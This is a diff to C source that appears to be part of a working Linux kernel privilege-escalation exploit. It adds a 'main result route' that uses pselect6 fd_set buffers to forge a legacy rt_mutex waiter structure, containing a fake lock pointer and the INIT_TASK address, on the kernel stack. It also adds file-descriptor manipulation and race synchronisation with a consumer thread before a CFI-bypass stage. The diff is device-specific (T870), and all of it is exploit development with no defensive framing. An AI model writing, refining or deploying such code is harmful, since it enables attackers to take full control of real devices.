@@ -1,5 +1,17 @@
 #include "common.h"
 
+#ifndef APP_MAIN_PSELECT_RESULT_ROUTE
+#define APP_MAIN_PSELECT_RESULT_ROUTE 0
+#endif
+#if APP_MAIN_PSELECT_RESULT_ROUTE && \
+    (!defined(LEGACY_RT_MUTEX_WAITER) || !LEGACY_RT_MUTEX_WAITER)
+#error "main result fd-set route requires the legacy 0x50-byte waiter"
+#endif
+#if APP_MAIN_PSELECT_RESULT_ROUTE && \
+    (!defined(SLIDE_PSELECT_WORD_SHIFT) || SLIDE_PSELECT_WORD_SHIFT != 1)
+#error "main result fd-set route requires T870 word shift 1"
+#endif
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 #else
@@ -59,6 +71,15 @@ void fdset_put_word(fd_set *set, int word, uint64_t value) {
 
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+  (void)write_fd;
+  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
+    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
+      dup2(read_fd, fd);
+    }
+  }
+  return;
+#else
   int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
   if (high_write < 0) {
     pr_warning("pselect F_DUPFD write errno=%d\n", errno);
@@ -72,6 +93,7 @@ void open_selected_fds(
   close(high_write);
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
+#endif
 }
 
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
@@ -79,6 +101,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(out);
   FD_ZERO(ex);
 
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+  /*
+   * The exact T870 pselect6 stack places the 0x50-byte legacy waiter at
+   * result-input qword 1. Preserve the upstream FOPS waiter semantics while
+   * serializing the legacy tree/pi-tree/task/lock/prio/deadline layout.
+   */
+  fdset_put_word(in, 1, fake_w0);
+  fdset_put_word(in, 2, 0);
+  fdset_put_word(in, 3, 0);
+  fdset_put_word(in, 4, 0);
+  fdset_put_word(out, 0, 0);
+  fdset_put_word(out, 1, 0);
+  fdset_put_word(out, 2, text_addr(INIT_TASK));
+  fdset_put_word(out, 3, fake_lock);
+  fdset_put_word(out, 4, FAKE_WAITER_PRIO);
+  fdset_put_word(ex, 0, 0);
+#else
   fdset_put_word(in, 0, fake_w0);
   fdset_put_word(in, 1, 0);
   fdset_put_word(in, 2, 0);
@@ -87,6 +126,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(ex, 1, fake_lock);
   fdset_put_word(ex, 2, 3);
   fdset_put_word(ex, 3, 0);
+#endif
 }
 
 void do_pselect_fake_lock_route(void) {
@@ -117,11 +157,27 @@ void do_pselect_fake_lock_route(void) {
 
     int pipefd[2];
     SYSCHK(pipe(pipefd));
-    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    int block_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
+    if (block_fd < 0) {
+      cfi_last_step = 31;
+      cfi_last_errno = errno;
+      pr_error("pselect result-route open /dev/null errno=%d\n", errno);
+      close(pipefd[0]);
+      close(pipefd[1]);
+      break;
+    }
+#else
+    int block_fd = pipefd[0];
+#endif
+    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
     if (high_read < 0) {
       cfi_last_step = 31;
       cfi_last_errno = errno;
       pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      if (block_fd != pipefd[0]) {
+        close(block_fd);
+      }
       close(pipefd[0]);
       close(pipefd[1]);
       break;
@@ -131,7 +187,60 @@ void do_pselect_fake_lock_route(void) {
     fd_set out;
     fd_set ex;
     prepare_pselect_fdsets(&in, &out, &ex);
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    fd_set expected_in = in;
+    fd_set expected_out = out;
+    fd_set expected_ex = ex;
+    int exception_bit = -1;
+    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
+      if (FD_ISSET(fd, &ex)) {
+        exception_bit = fd;
+        break;
+      }
+    }
+    if (exception_bit >= 0) {
+      cfi_last_step = 35;
+      cfi_last_errno = 0;
+      pr_error("pselect result-route cannot encode exception bit fd=%d\n",
+               exception_bit);
+      close(high_read);
+      close(block_fd);
+      close(pipefd[0]);
+      close(pipefd[1]);
+      break;
+    }
+#endif
     open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    const int sentinel_fd = 63;
+    int sentinel_backup = fcntl(sentinel_fd, F_DUPFD_CLOEXEC,
+                                PSELECT_ROUTE_NFDS + 32);
+    int sentinel_was_open = sentinel_backup >= 0;
+    if (!sentinel_was_open && errno != EBADF) {
+      pr_error("pselect result-copy sentinel backup errno=%d\n", errno);
+      close(high_read);
+      close(block_fd);
+      close(pipefd[0]);
+      close(pipefd[1]);
+      break;
+    }
+    if (dup2(pipefd[0], sentinel_fd) < 0) {
+      pr_error("pselect result-copy sentinel dup2 errno=%d\n", errno);
+      if (sentinel_was_open) {
+        close(sentinel_backup);
+      }
+      close(high_read);
+      close(block_fd);
+      close(pipefd[0]);
+      close(pipefd[1]);
+      break;
+    }
+    FD_SET(sentinel_fd, &in);
+    atomic_store(&main_result_sentinel_word, (uintptr_t)&in);
+    atomic_store(&main_result_sentinel_mask, 1ULL << sentinel_fd);
+    atomic_store(&main_result_syscall_returned, 0);
+    atomic_store(&main_result_seen_after_return, -1);
+#endif
 
     atomic_store(&consumer_calls, 0);
     atomic_store(&consumer_success, 0);
@@ -145,9 +254,34 @@ void do_pselect_fake_lock_route(void) {
       .tv_nsec = 0,
     };
     struct timespec *timeoutp = &timeout;
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    timeoutp = NULL;
+#endif
 
     errno = 0;
-    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
+    int ret;
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    ret = (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS,
+                       &in, &out, &ex, timeoutp, NULL);
+    atomic_store(&main_result_syscall_returned, 1);
+    int result_ready =
+        ret > 0 && memcmp(&in, &expected_in, sizeof(in)) == 0 &&
+        memcmp(&out, &expected_out, sizeof(out)) == 0 &&
+        memcmp(&ex, &expected_ex, sizeof(ex)) == 0;
+    if (result_ready) {
+      for (size_t spins = 0;
+           atomic_load(&punch_consume_go) == route_attempt &&
+           spins < 100000000ULL; spins++) {
+        __asm__ volatile("yield" ::: "memory");
+      }
+    } else {
+      pr_error("pselect result-route fd-set mismatch ret=%d errno=%d\n",
+               ret, errno);
+      atomic_store(&punch_consume_go, 0);
+    }
+#else
+    ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
+#endif
     int saved_errno = errno;
     atomic_store(&punch_consume_go, 0);
     calls = atomic_load(&consumer_calls);
@@ -155,7 +289,28 @@ void do_pselect_fake_lock_route(void) {
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec);
 
+#if APP_MAIN_PSELECT_RESULT_ROUTE
+    pr_info("pselect result-copy ready=%d sentinel_cleared=%d "
+            "seen_after_return=%d syscall_returned=%d\n",
+            result_ready,
+            !(atomic_load(&main_result_sentinel_mask) &
+              *(volatile uint64_t *)atomic_load(&main_result_sentinel_word)),
+            atomic_load(&main_result_seen_after_return),
+            atomic_load(&main_result_syscall_returned));
+    if (sentinel_was_open) {
+      if (dup2(sentinel_backup, sentinel_fd) < 0) {
+        pr_warning("pselect result-copy sentinel restore errno=%d\n", errno);
+      }
+      close(sentinel_backup);
+    } else {
+      close(sentinel_fd);
+    }
+    atomic_store(&main_result_sentinel_word, 0);
+    atomic_store(&main_result_sentinel_mask, 0);
+    int route_signal = result_ready && calls > 0 && success > 0;
+#else
     int route_signal = calls > 0 && success > 0;
+#endif
     if (route_signal) {
       if (try_cfi_stage()) {
         cfi_last_step = 0;
@@ -169,6 +324,9 @@ void do_pselect_fake_lock_route(void) {
     }
 
     close(high_read);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
     close(pipefd[0]);
     close(pipefd[1]);
 
